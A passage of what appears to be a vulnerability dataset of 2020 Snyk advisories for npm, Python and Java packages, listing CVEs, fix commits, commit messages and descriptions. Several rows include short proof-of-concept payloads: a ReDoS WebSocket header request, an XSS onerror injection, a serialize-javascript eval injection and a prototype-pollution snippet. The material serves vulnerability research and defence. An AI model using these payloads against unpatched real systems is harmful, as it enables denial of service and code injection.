thereby removes the ReDoS vector. Technically this means it does not
match the grammar of RFC 6455, but we expect this to have little or no
practical impact, especially since the one main protocol extension,
`permessage-deflate` ([RFC 7692][4]), does not have any string-valued
parameters.

[1]: https://tools.ietf.org/html/rfc6455#section-9.1
[2]: https://tools.ietf.org/html/rfc2616#section-2.2
[3]: https://tools.ietf.org/html/rfc7230#section-3.2.6
[4]: https://tools.ietf.org/html/rfc7692",JavaScript,8.2,high,"websocket-extensions is a generic extension manager for WebSocket connections.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). The EXT_LIST variable within extension parser may take quadratic time when parsing literal backslash (\) followed by any character, resulting in backtracking. 
This could be abused by an attacker to conduct Regex Denial Of Service (ReDoS) on a single-threaded server by providing a malicious payload with the Sec-WebSocket-Extensions header.
PoC by Robert McLaughlin
GET / HTTP/1.1
Host: localhost:8081
Sec-WebSocket-Version: 13
Sec-WebSocket-Extensions: foo;bar=""fooa\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a
Sec-WebSocket-Key: nqCLn4uQ/wUGGLtjAILmxQ==
Connection: keep-alive, Upgrade
Upgrade: websocket",2020
CVE-2020-7648,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-SNYKBROKER-570607,29/05/2020,28/05/2020,https://github.com/snyk/broker/commit/3e5654e7df9c9bb547da69d6db4b303c825d4dee,Arbitrary File Read,https://api.github.com/repos/snyk/broker/commits/3e5654e7df9c9bb547da69d6db4b303c825d4dee,Yulia Bar-On,yulia@snyk.io,broker,3e5654e7df9c9bb547da69d6db4b303c825d4dee,fix: discard any information in url after a fragment identifier,Unknown,4.9,medium,"snyk-broker is a package that proxies access between snyk.io and your Git repositories, such as GitHub Enterprise, GitHub.com and Bitbucket Server. Snyk Broker can also be used to enable a secure connection with your on-premise Jira deployment.
Affected versions of this package are vulnerable to Arbitrary File Read. It allows arbitrary file reads for users who have access to Snyk's internal network  by appending the URL with a fragment identifier and a whitelisted path e.g. #package.json",2020
,CWE-347,Snyk,https://security.snyk.io/vuln/SNYK-JS-ELECTRONUPDATER-567704,21/05/2020,28/04/2020,https://github.com/electron-userland/electron-builder/commit/82d66026fd04f8115d7a06221fbe058ff56a283a,Signature Validation Bypass,https://api.github.com/repos/electron-userland/electron-builder/commits/82d66026fd04f8115d7a06221fbe058ff56a283a,develar,develar@gmail.com,electron-builder,82d66026fd04f8115d7a06221fbe058ff56a283a,"fix(electron-updater): forbid back tick

Close #4701",TypeScript,6.5,medium,"electron-updater is a module allowing applications to implement auto-update functionality.
Affected versions of this package are vulnerable to Signature Validation Bypass. The signature verification check is based on a string comparison between the installed binary’s publisherName and the certificate’s Common Name attribute of the update binary. During a software update, the application will request a file named latest.yml from the update server, which contains the definition of the new release - including the binary filename and hashes.
Using a filename containing a backtick (`), among other symbols and a matching hash, an attacker could bypass the entire signature verification by triggering a parse error in the script. 
This can be leveraged to force a malicious update on Windows clients, effectively gaining code execution and persistence capabilities.
Exploitation of this vulnerability requires the attacker to also have control over the update server, or alternatively a man-in-the-middle.
A partial fix has been made available, blacklisting a small set of characters, but there are additional characters that can be used to exploit this vulnerability.",2020
CVE-2020-7658,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-MEINHELD-569140,21/05/2020,17/05/2020,https://github.com/mopemope/meinheld/commit/4155876bfd3e8fc4adad4aaa59ec3f1cefa1d2d1,HTTP Request Smuggling,https://api.github.com/repos/mopemope/meinheld/commits/4155876bfd3e8fc4adad4aaa59ec3f1cefa1d2d1,mopemope,yutaka.matsubara@gmail.com,meinheld,4155876bfd3e8fc4adad4aaa59ec3f1cefa1d2d1,Fix to process only correct header names,C/C++,8.2,high,"meinheld is a High performance asynchronous Python WSGI Web Server
Affected versions of this package are vulnerable to HTTP Request Smuggling. HTTP pipelining issues and request smuggling attacks might be possible due to incorrect Content-Length and Transfer encoding header parsing.
It is possible conduct HTTP request smuggling attacks by sending the Content-Length header twice. By manipulating the HTTP response the attacker could poison a web-cache, perform an XSS attack, or obtain sensitive information from requests other than their own. Furthermore, invalid Transfer Encoding headers were found to be parsed as valid which could be leveraged for CL:TE or TE:CL smuggling attacks.",2020
CVE-2020-7655,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-PYTHON-NETIUS-569141,19/05/2020,19/05/2020,https://github.com/hivesolutions/netius/commit/9830881ef68328f8ea9c7901db1d11690677e7d1,HTTP Request Smuggling,https://api.github.com/repos/hivesolutions/netius/commits/9830881ef68328f8ea9c7901db1d11690677e7d1,joamag,joamag@hive.pt,netius,9830881ef68328f8ea9c7901db1d11690677e7d1,More secure header naming validation,Python,8.2,high,"netius is a Python network library that can be used for the rapid creation of asynchronous non-blocking servers and clients.
Affected versions of this package are vulnerable to HTTP Request Smuggling. HTTP pipelining issues and request smuggling attacks might be possible due to incorrect Transfer encoding header parsing which could allow for CL:TE or TE:TE attacks.
By manipulating the HTTP response the attacker could poison a web-cache, perform an XSS attack, or obtain sensitive information from requests other than their own.",2020
CVE-2020-7647,CWE-23,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-IOJOOBY-568806,11/05/2020,11/05/2020,https://github.com/jooby-project/jooby/commit/34f526028e6cd0652125baa33936ffb6a8a4a009,Directory Traversal,https://api.github.com/repos/jooby-project/jooby/commits/34f526028e6cd0652125baa33936ffb6a8a4a009,Edgar Espina,espina.edgar@gmail.com,jooby,34f526028e6cd0652125baa33936ffb6a8a4a009,asset: path traversal fix #1639,Java,5.3,medium,"io.jooby:jooby is a modular web framework for Java and Kotlin.
Affected versions of this package are vulnerable to Directory Traversal. There are two ways this vulnerability can be leveraged:",2020
CVE-2020-7662,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-WEBSOCKETEXTENSIONS-570623,02/06/2020,02/06/2020,https://github.com/faye/websocket-extensions-node/commit/29496f6838bfadfe5a2f85dff33ed0ba33873237,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/faye/websocket-extensions-node/commits/29496f6838bfadfe5a2f85dff33ed0ba33873237,James Coglan,jcoglan@gmail.com,websocket-extensions-node,29496f6838bfadfe5a2f85dff33ed0ba33873237,"Remove ReDoS vulnerability in the Sec-WebSocket-Extensions header parser

There is a regular expression denial of service (ReDoS) vulnerability in
the parser we use to process the `Sec-WebSocket-Extensions` header. It
can be exploited by sending an opening WebSocket handshake to a server
containing a header of the form:

    Sec-WebSocket-Extensions: a;b=""\c\c\c\c\c\c\c\c\c\c ...

i.e. a header containing an unclosed string parameter value whose
content is a repeating two-byte sequence of a backslash and some other
character. The parser takes exponential time to reject this header as
invalid, and this can be used to exhaust the server's capacity to
process requests.

This vulnerability has been assigned the identifier CVE-2020-7662 and
was reported by Robert McLaughlin.

We believe this flaw stems from the grammar specified for this header.
[RFC 6455][1] defines the grammar for the header as:

    Sec-WebSocket-Extensions = extension-list

    extension-list    = 1#extension
    extension         = extension-token *( "";"" extension-param )
    extension-token   = registered-token
    registered-token  = token
    extension-param   = token [ ""="" (token | quoted-string) ]

It refers to [RFC 2616][2] for the definitions of `token` and
`quoted-string`, which are:

    token          = 1*<any CHAR except CTLs or separators>
    separators     = ""("" | "")"" | ""<"" | "">"" | ""@""
                   | "","" | "";"" | "":"" | ""\"" | <"">
                   | ""/"" | ""["" | ""]"" | ""?"" | ""=""
                   | ""{"" | ""}"" | SP | HT

    quoted-string  = ( <""> *(qdtext | quoted-pair ) <""> )
    qdtext         = <any TEXT except <"">>
    quoted-pair    = ""\"" CHAR

These rely on the `CHAR`, `CTL` and `TEXT` grammars, which are:

    CHAR           = <any US-ASCII character (octets 0 - 127)>
    CTL            = <any US-ASCII control character (octets 0 - 31) and DEL (127)>
    TEXT           = <any OCTET except CTLs, but including LWS>

Other relevant definitions to support these:

    OCTET          = <any 8-bit sequence of data>
    LWS            = [CRLF] 1*( SP | HT )
    CRLF           = CR LF

    HT             = <US-ASCII HT, horizontal-tab (9)>
    LF             = <US-ASCII LF, linefeed (10)>
    CR             = <US-ASCII CR, carriage return (13)>
    SP             = <US-ASCII SP, space (32)>

To expand some of these terms out and write them as regular expressions:

    OCTET         = [\x00-\xFF]
    CHAR          = [\x00-\x7F]
    TEXT          = [\t \x21-\x7E\x80-\xFF]

The allowable bytes for `token` are [\x00-\x7F], except [\x00-\x1F\x7F]
(leaving [\x20-\x7E]) and `separators`, which leaves the following set
of allowed chars:

    ! # $ % & ' * + - . ^ _ ` | ~ [0-9] [A-Z] [a-z]

`quoted-string` contains a repeated pattern of either `qdtext` or
`quoted-pair`. `qdtext` is any `TEXT` byte except <"">, and the <"">
character is ASCII 34, or 0x22. The <!> character is 0x21. So `qdtext`
can be written either positively as:

    qdtext        = [\t !\x23-\x7E\x80-\xFF]

or negatively, as:

    qdtext        = [^\x00-\x08\x0A-\x1F\x7F""]

We use the negative definition here. The other alternative in the
`quoted-string` pattern is:

    quoted-pair   = \\[\x00-\x7F]

The problem is that the set of bytes matched by `qdtext` includes <\>,
and intersects with the second element of `quoted-pair`. That means the
sequence \c can be matched as either two `qdtext` bytes, or as a single
`quoted-pair`. When the regex engine fails to find a trailing <""> to
close the string, it back-tracks and tries every alternate parse for the
string, which doubles with each pair of bytes in the input.

To fix the ReDoS flaw we need to rewrite the repeating pattern so that
none of its alternate branches can match the same text. For example, we
could try dividing the set of bytes [\x00-\xFF] into those that must not
follow a <\>, those that may follow a <\>, and those that must be
preceded by <\>, and thereby construct a pattern of the form:

    (A|\?B|\C)*

where A, B and C have no characters in common. In our case the three
branch patterns would be:

    A   =   qdtext - CHAR   =   [\x80-\xFF]
    B   =   qdtext & CHAR   =   [\t !\x23-\x7E]
    C   =   CHAR - qdtext   =   [\x00-\x08\x0A-\x1F\x7F""]

These sets do not intersect, and notice <""> appears in set C so must be
preceded by <\>. But we still have a problem: <\> (0x5C) and all the
alphabetic characters are in set B, so the pattern \?B can match all
these:

    c
    \
    \c

So the sequence \c\c\c... still produces exponential back-tracking. It
also fails to parse input like this correctly:

    Sec-WebSocket-Extensions: a; b=""c\"", d""

Because the grammar allows a single backslash to appear by itself, this
is arguably a syntax error where the parameter `b` has value `c\` and
then a new extension `d` begins with a <""> appearing where it should
not.

So the core problem is with the grammar itself: `qdtext` matches a
single backslash <\>, and `quoted-pair` matches a pair <\\>. So given a
sequence of backslashes there's no canonical parse and the grammar is
ambiguous.

[RFC 7230][3] remedies this problem and makes the grammar clearer.
First, it defines `token` explicitly rather than implicitly:

    token          = 1*tchar

    tchar          = ""!"" / ""#"" / ""$"" / ""%"" / ""&"" / ""'"" / ""*""
                   / ""+"" / ""-"" / ""."" / ""^"" / ""_"" / ""`"" / ""|"" / ""~""
                   / DIGIT / ALPHA

And second, it defines `quoted-string` so that backslashes cannot appear
on their own:

     quoted-string  = DQUOTE *( qdtext / quoted-pair ) DQUOTE
     qdtext         = HTAB / SP /%x21 / %x23-5B / %x5D-7E / obs-text
     obs-text       = %x80-FF
     quoted-pair    = ""\"" ( HTAB / SP / VCHAR / obs-text )

where VCHAR is any printing ASCII character 0x21-0x7E. Notice `qdtext`
is just our previous definition but with 5C excluded, so it cannot
accept a single backslash.

This commit makes this modification to our matching patterns, and
thereby removes the ReDoS vector. Technically this means it does not
match the grammar of RFC 6455, but we expect this to have little or no
practical impact, especially since the one main protocol extension,
`permessage-deflate` ([RFC 7692][4]), does not have any string-valued
parameters.

[1]: https://tools.ietf.org/html/rfc6455#section-9.1
[2]: https://tools.ietf.org/html/rfc2616#section-2.2
[3]: https://tools.ietf.org/html/rfc7230#section-3.2.6
[4]: https://tools.ietf.org/html/rfc7692",JavaScript,8.2,high,"websocket-extensions is a Generic extension manager for WebSocket connections
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). The EXT_LIST variable within extension parser may take quadratic time when parsing literal backslash (\) followed by any character, resulting in backtracking. 
This could be abused by an attacker to conduct Regex Denial Of Service (ReDoS) on a single-threaded server by providing a malicious payload with the Sec-WebSocket-Extensions header.
PoC by Robert McLaughlin
GET / HTTP/1.1
Host: localhost:8081
Sec-WebSocket-Version: 13
Sec-WebSocket-Extensions: foo;bar=""fooa\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a\a
Sec-WebSocket-Key: nqCLn4uQ/wUGGLtjAILmxQ==
Connection: keep-alive, Upgrade
Upgrade: websocket",2020
CVE-2020-7647,CWE-23,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-ORGJOOBY-568807,11/05/2020,11/05/2020,https://github.com/jooby-project/jooby/commit/34f526028e6cd0652125baa33936ffb6a8a4a009,Directory Traversal,https://api.github.com/repos/jooby-project/jooby/commits/34f526028e6cd0652125baa33936ffb6a8a4a009,Edgar Espina,espina.edgar@gmail.com,jooby,34f526028e6cd0652125baa33936ffb6a8a4a009,asset: path traversal fix #1639,Java,5.3,medium,"org.jooby:jooby is a modern, performant and easy to use web framework for Java and Kotlin built on top of your favorite web server.
Affected versions of this package are vulnerable to Directory Traversal. There are two ways this vulnerability can be leveraged:",2020
CVE-2020-7661,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-URLREGEX-569472,02/06/2020,18/05/2020,https://github.com/nescalante/urlregex/commit/e5a085afe6abfaea1d1a78f54c45af9ef43ca1f9,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/nescalante/urlregex/commits/e5a085afe6abfaea1d1a78f54c45af9ef43ca1f9,huntr-helper,admin@418sec.com,urlregex,e5a085afe6abfaea1d1a78f54c45af9ef43ca1f9,"Security Fix for Regular Expression Denial of Service (ReDoS) - huntr.dev (#8)

* Added two dangerous URLs to the fixtures array.

* WIP: ReDoS mitigation - Fixed catastrophic backtracking that was happening at the check for a basic auth sequence, i.e. http://username:pass@example.com, but there is another happening at the domain var at line 11.

* WIP: ReDoS mitigation - current state of my update fixes the vuln, but breaks 4 tests.

* Added opt for punycode validation. Also made some minor regex tweaks. Passing all of notmatch and only failing 2 of urlmatch.

* Added punycode url fixtures.

* Simplified regex since case is always ignored.

* Abandoned my fix and implemented RE2 to replace the built-in regex engine.

* Removed the punycode validation I added because one of the operators does not work with RE2.

Co-authored-by: Ben <beale.ben@gmail.com>
Co-authored-by: Jamie Slome <55323451+JamieSlome@users.noreply.github.com>",JavaScript,7.5,high,"url-regex is a package with regular expression for matching URLs
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). An attacker providing a very long string in String.test can cause a Denial of Service.",2020
CVE-2020-7660,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-SERIALIZEJAVASCRIPT-570062,01/06/2020,20/05/2020,https://github.com/yahoo/serialize-javascript/commit/f21a6fb3ace2353413761e79717b2d210ba6ccbd,Arbitrary Code Injection,https://api.github.com/repos/yahoo/serialize-javascript/commits/f21a6fb3ace2353413761e79717b2d210ba6ccbd,Ryan Siebert,Siebes@users.noreply.github.com,serialize-javascript,f21a6fb3ace2353413761e79717b2d210ba6ccbd,"Don't replace regex / function placeholders within string literals (#79)

Previously we weren't checking if the quote that started the placeholder
was escaped or not, meaning an object like

    {""foo"": /1""/, ""bar"": ""a\""@__R-<UID>-0__@""}

Would be serialized as

    {""foo"": /1""/, ""bar"": ""a\/1""/}

meaning an attacker could escape out of `bar` if they controlled both
`foo` and `bar` and were able to guess the value of `<UID>`.

UID was generated once on startup, was chosen using `Math.random()` and
had a keyspace of roughly 4 billion, so within the realm of an online
attack.

Here's a simple example that will cause `console.log()` to be called when
the `serialize()`d version is `eval()`d

    eval('('+ serialize({""foo"": /1"" + console.log(1)/i, ""bar"": '""@__R-<UID>-0__@'}) + ')');

Where `<UID>` is the guessed `UID`.

This fixes the issue by ensuring that placeholders are not preceded by
a backslash.

We also switch to a higher entropy `UID` to prevent people from guessing it.

Co-authored-by: Jordan Milne <jmilne@uber.com>
Co-authored-by: Ryan Siebert <ryan.siebert@energyaustralia.com.au>",JavaScript,7.7,high,"serialize-javascript is a package to serialize JavaScript to a superset of JSON that includes regular expressions and functions.
Affected versions of this package are vulnerable to Arbitrary Code Injection. An object like {""foo"": /1""/, ""bar"": ""a\""@__R-<UID>-0__@""} would be serialized as {""foo"": /1""/, ""bar"": ""a\/1""/}, meaning an attacker could escape out of bar if they controlled both foo and bar and were able to guess the value of <UID>. UID is generated once on startup, is chosen using Math.random() and has a keyspace of roughly 4 billion, so within the realm of an online attack.
PoC
eval('('+ serialize({""foo"": /1"" + console.log(1)/i, ""bar"": '""@__R-<UID>-0__@'}) + ')');",2020
CVE-2020-7661,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-URLREGEX-2825197,02/06/2020,18/05/2020,https://github.com/nescalante/urlregex/commit/e5a085afe6abfaea1d1a78f54c45af9ef43ca1f9,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/nescalante/urlregex/commits/e5a085afe6abfaea1d1a78f54c45af9ef43ca1f9,huntr-helper,admin@418sec.com,urlregex,e5a085afe6abfaea1d1a78f54c45af9ef43ca1f9,"Security Fix for Regular Expression Denial of Service (ReDoS) - huntr.dev (#8)

* Added two dangerous URLs to the fixtures array.

* WIP: ReDoS mitigation - Fixed catastrophic backtracking that was happening at the check for a basic auth sequence, i.e. http://username:pass@example.com, but there is another happening at the domain var at line 11.

* WIP: ReDoS mitigation - current state of my update fixes the vuln, but breaks 4 tests.

* Added opt for punycode validation. Also made some minor regex tweaks. Passing all of notmatch and only failing 2 of urlmatch.

* Added punycode url fixtures.

* Simplified regex since case is always ignored.

* Abandoned my fix and implemented RE2 to replace the built-in regex engine.

* Removed the punycode validation I added because one of the operators does not work with RE2.

Co-authored-by: Ben <beale.ben@gmail.com>
Co-authored-by: Jamie Slome <55323451+JamieSlome@users.noreply.github.com>",JavaScript,7.5,high,"urlregex is a no-dependency URL validation for Node and the browser.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS). An attacker providing a very long string in String.test can cause a Denial of Service.",2020
CVE-2020-7654,CWE-200,Snyk,https://security.snyk.io/vuln/SNYK-JS-SNYKBROKER-570613,29/05/2020,28/05/2020,https://github.com/snyk/broker/commit/7ab581db3234dfd257ed77a055601ec6e396becc,Information Exposure,https://api.github.com/repos/snyk/broker/commits/7ab581db3234dfd257ed77a055601ec6e396becc,Tom Robinson,tom.robinson@snyk.io,broker,7ab581db3234dfd257ed77a055601ec6e396becc,fix: sanitize origin in logs,JavaScript,6.2,medium,"snyk-broker is a package that proxies access between snyk.io and your Git repositories, such as GitHub Enterprise, GitHub.com and Bitbucket Server. Snyk Broker can also be used to enable a secure connection with your on-premise Jira deployment.
Affected versions of this package are vulnerable to Information Exposure. It logs private keys if logging level is set to DEBUG.",2020
CVE-2020-7651,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-SNYKBROKER-570610,29/05/2020,28/05/2020,https://github.com/snyk/broker/commit/7773d92fff312cbaa86407e663b3e77d731560bf,Arbitrary File Read,https://api.github.com/repos/snyk/broker/commits/7773d92fff312cbaa86407e663b3e77d731560bf,Tom Robinson,tom.ro88o@gmail.com,broker,7773d92fff312cbaa86407e663b3e77d731560bf,feat: add request header filtering,Markdown,4.9,medium,"snyk-broker is a package that proxies access between snyk.io and your Git repositories, such as GitHub Enterprise, GitHub.com and Bitbucket Server. Snyk Broker can also be used to enable a secure connection with your on-premise Jira deployment.
Affected versions of this package are vulnerable to Arbitrary File Read. It allows partial file reads for users who have access to Snyk's internal network via patch history from GitHub Commits API.",2020
CVE-2020-7650,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-SNYKBROKER-570609,29/05/2020,28/05/2020,https://github.com/snyk/broker/commit/cda1ad74fbaa4642e3fcd0386ce39fcbfe3dea24,Arbitrary File Read,https://api.github.com/repos/snyk/broker/commits/cda1ad74fbaa4642e3fcd0386ce39fcbfe3dea24,orkamara,orkamara@gmail.com,broker,cda1ad74fbaa4642e3fcd0386ce39fcbfe3dea24,"""feat: REVERT - add Cloud Config support to the accept.json.sample""

This reverts commit 876158f11bfba9938527a1a1fcbcc11e5d40eb42.",Unknown,2.7,low,"snyk-broker is a package that proxies access between snyk.io and your Git repositories, such as GitHub Enterprise, GitHub.com and Bitbucket Server. Snyk Broker can also be used to enable a secure connection with your on-premise Jira deployment.
Affected versions of this package are vulnerable to Arbitrary File Read. It allows arbitrary file reads to users with access to Snyk's internal network of any files ending in the following extensions: yaml, yml or json.",2020
CVE-2020-7642,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-LAZYSIZES-567144,21/04/2020,21/04/2020,https://github.com/aFarkas/lazysizes/commit/3720ab8262552d4e063a38d8492f9490a231fd48,Cross-site Scripting (XSS),https://api.github.com/repos/aFarkas/lazysizes/commits/3720ab8262552d4e063a38d8492f9490a231fd48,Alexander Farkas,alex@boffinhouse.com,lazysizes,3720ab8262552d4e063a38d8492f9490a231fd48,Video embed: test yt/vimeo id (fixes #764),JavaScript,5.7,medium,"lazysizes is a fast (jank-free), SEO-friendly and self-initializing lazyloader for images (including responsive images picture/srcset), iframes, scripts/widgets and much more. It also prioritizes resources by differentiating between crucial in view and near view elements to make perceived performance even faster.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) 
due to unsafe usage of innerHTML. The following attributes are not sanitized by the video-embed plugin: data-vimeo, data-vimeoparams, data-youtube and data-ytparams  which can be abused to inject malicious JavaScript.
PoC
<html>
<head>
    <script src=""https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.2.0/lazysizes.min.js""></script>
    <script src=""https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.2.0/plugins/video-embed/ls.video-embed.min.js""></script>
</head>
<body>
    <div class=""ratio-16-9 lazyload"" data-youtube=""M7lc1UVf-VE"" data-ytparams=""&quot;&gt;&lt;/iframe&gt;&lt;img src=x onerror=alert(1)&gt;"">
        <button class=""play-btn"">play</button>
    </div>    
</body>
</html>",2020
CVE-2020-7640,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-FUNMAP-564436,09/04/2020,10/03/2020,https://github.com/jhuckaby/pixl-class/commit/47677a3638e3583e42f3a05cc7f0b30293d2acc8,Arbitrary Code Execution,https://api.github.com/repos/jhuckaby/pixl-class/commits/47677a3638e3583e42f3a05cc7f0b30293d2acc8,Joseph Huckaby,jhuckaby@gmail.com,pixl-class,47677a3638e3583e42f3a05cc7f0b30293d2acc8,"Version 1.0.3

Fixes code injection vulnerability reported by Synk.io.
No longer uses eval (which is evil anyway).",JavaScript,8.6,high,"fun-map is a functional utilities for pretending that JS objects are Clojure string maps.
Affected versions of this package are vulnerable to Arbitrary Code Execution. The injection point is located in line 26 in the index file class.js; the members argument of the create function can be controlled by users without any sanitization.",2020
CVE-2020-7640,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-PIXLCLASS-564968,09/04/2020,10/03/2020,https://github.com/jhuckaby/pixl-class/commit/47677a3638e3583e42f3a05cc7f0b30293d2acc8,Arbitrary Code Execution,https://api.github.com/repos/jhuckaby/pixl-class/commits/47677a3638e3583e42f3a05cc7f0b30293d2acc8,Joseph Huckaby,jhuckaby@gmail.com,pixl-class,47677a3638e3583e42f3a05cc7f0b30293d2acc8,"Version 1.0.3

Fixes code injection vulnerability reported by Synk.io.
No longer uses eval (which is evil anyway).",JavaScript,8.6,high,"pixl-class is a library that allows you to create classes in a more classical sort of way, including support for static class members, proper constructors, inheritance, and mixins.
Affected versions of this package are vulnerable to Arbitrary Code Execution. The injection point is located in line 26 in the index file class.js; the members argument of the create function can be controlled by users without any sanitization.",2020
CVE-2020-7639,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-EIVINDFJELDSTADDOT-564434,05/04/2020,05/04/2020,https://github.com/eivindfjeldstad/dot/commit/774e4b0c97ca35d2ae40df2cd14428d37dd07a0b,Prototype Pollution,https://api.github.com/repos/eivindfjeldstad/dot/commits/774e4b0c97ca35d2ae40df2cd14428d37dd07a0b,Eivind Fjeldstad,eivind.fjeldstad@gmail.com,dot,774e4b0c97ca35d2ae40df2cd14428d37dd07a0b,Prevent prototype pollution,JavaScript,4.2,medium,"eivindfjeldstad-dot is a module that Gets and sets object properties with dot notation.
Note: this package has been deprecated and moved into @eivifj/dot.
Affected versions of this package are vulnerable to Prototype Pollution. The function set could be tricked into adding or modifying properties of Object.prototype using a __proto__ payload.",2020
CVE-2020-7637,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-CLASSTRANSFORMER-564431,05/04/2020,05/04/2020,https://github.com/typestack/class-transformer/commit/8f04eb9db02de708f1a20f6f2d2bb309b2fed01e,Prototype Pollution,https://api.github.com/repos/typestack/class-transformer/commits/8f04eb9db02de708f1a20f6f2d2bb309b2fed01e,Kessiler Rodrigues,keessiler@hotmail.com,class-transformer,8f04eb9db02de708f1a20f6f2d2bb309b2fed01e,Fix prototype pollution vulnerabilities,TypeScript,4.2,medium,"class-transformer is a Proper decorator-based transformation / serialization / deserialization of plain javascript objects to class constructors.
Affected versions of this package are vulnerable to Prototype Pollution the classToPlainFromExist function could be tricked into adding or modifying properties of Object.prototype using a __proto__ payload.",2020
CVE-2020-7638,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-CONFINIT-564433,05/04/2020,05/04/2020,https://github.com/davideicardi/confinit/commit/a34e06ca5c1c8b047ef112ef188b2fe30d2a1eab,Prototype Pollution,https://api.github.com/repos/davideicardi/confinit/commits/a34e06ca5c1c8b047ef112ef188b2fe30d2a1eab,Davide Icardi,davide.icardi@gmail.com,confinit,a34e06ca5c1c8b047ef112ef188b2fe30d2a1eab,Close #1,TypeScript,4.2,medium,"confinit is an Application configuration helpers for Node.Js.
Affected versions of this package are vulnerable to Prototype Pollution.
The setDeepProperty function could be tricked into adding or modifying properties of Object.prototype using a __proto__ payload.",2020
CVE-2020-7639,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-EIVIFJDOT-564435,05/04/2020,05/04/2020,https://github.com/eivindfjeldstad/dot/commit/774e4b0c97ca35d2ae40df2cd14428d37dd07a0b,Prototype Pollution,https://api.github.com/repos/eivindfjeldstad/dot/commits/774e4b0c97ca35d2ae40df2cd14428d37dd07a0b,Eivind Fjeldstad,eivind.fjeldstad@gmail.com,dot,774e4b0c97ca35d2ae40df2cd14428d37dd07a0b,Prevent prototype pollution,JavaScript,4.2,medium,"@eivifj/dot is a module that gets and sets object properties with dot notation.
Affected versions of this package are vulnerable to Prototype Pollution. The function set could be tricked into adding or modifying properties of Object.prototype using a __proto__ payload.",2020
CVE-2020-7631,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-JS-DISKUSAGENG-564425,05/04/2020,05/04/2020,https://github.com/iximiuz/node-diskusage-ng/commit/48e7e093486b528f0c81ec699573e0e4a431b8d3#diff-38182cfe286a150ebcc88df0ec57ed66,Command Injection,https://api.github.com/repos/iximiuz/node-diskusage-ng/commits/48e7e093486b528f0c81ec699573e0e4a431b8d3#diff-38182cfe286a150ebcc88df0ec57ed66,Colin GILLE,congelli501@gmail.com,node-diskusage-ng,48e7e093486b528f0c81ec699573e0e4a431b8d3,"Use execFile instead of exec

To prevent security risk & improve performance (do not rely on a shell)",JavaScript,6.5,medium,"diskusage-ng is a package that get disk usage info in pure JavaScript and without any dependencies.
Affected versions of this package are vulnerable to Command Injection. The argument path can be controlled by users without any sanitization.",2020
CVE-2020-7622,CWE-113,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-IOJOOBY-564249,02/04/2020,02/04/2020,https://github.com/jooby-project/jooby/commit/b66e3342cf95205324023cfdf2cb5811e8a6dcf4,HTTP Response Splitting,https://api.github.com/repos/jooby-project/jooby/commits/b66e3342cf95205324023cfdf2cb5811e8a6dcf4,Edgar Espina,espina.edgar@gmail.com,jooby,b66e3342cf95205324023cfdf2cb5811e8a6dcf4,CWE-113: Improper Neutralization of CRLF Sequences in HTTP Headers ('HTTP Response Splitting fix #GHSA-gv3v-92v6-m48j,Java,6.5,medium,"io.jooby:jooby-netty is a netty implementation in jooby
Affected versions of this package are vulnerable to HTTP Response Splitting. The DefaultHttpHeaders is set to false which means it does not validates that the header isn't being abused for HTTP Response Splitting.",2020
CVE-2020-7634,CWE-74,Snyk,https://security.snyk.io/vuln/SNYK-JS-HEROKUADDONPOOL-564428,05/04/2020,05/04/2020,https://github.com/nodef/heroku-addonpool/commit/b1a5b316473ac92d783f3d54ee048d54082da38d,Command Injection,https://api.github.com/repos/nodef/heroku-addonpool/commits/b1a5b316473ac92d783f3d54ee048d54082da38d,Subhajit Sahu,wolfram77@gmail.com,heroku-addonpool,b1a5b316473ac92d783f3d54ee048d54082da38d,fix Command Injection vulnerability,Markdown,6.5,medium,"heroku-addonpool is a tool that Managing Addon Pool of an App in Heroku.
Affected versions of this package are vulnerable to Command Injection. The second parameter of the exported function HerokuAddonPool(id, app, opt) can be controlled by users without any sanitization.",2020
CVE-2020-7618,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-SDS-564123,01/04/2020,01/04/2020,https://github.com/monsterkodi/sds/commit/a228f025fd1be033088b7abbc0f77118d573f216,Prototype Pollution,https://api.github.com/repos/monsterkodi/sds/commits/a228f025fd1be033088b7abbc0f77118d573f216,monsterkodi,monsterkodi@gmx.net,sds,a228f025fd1be033088b7abbc0f77118d573f216,make security bots happy,JavaScript,4.0,medium,"sds is a structured data search package.
Affected versions of this package are vulnerable to Prototype Pollution. The library could be tricked into adding or modifying properties of the Object.prototype by abusing the set function located in js/set.js.
PoC
var root = require(""sds"");
var payload = ""__proto__.jhu"";
root.set({},payload,true);
console.log({}.jhu);",2020
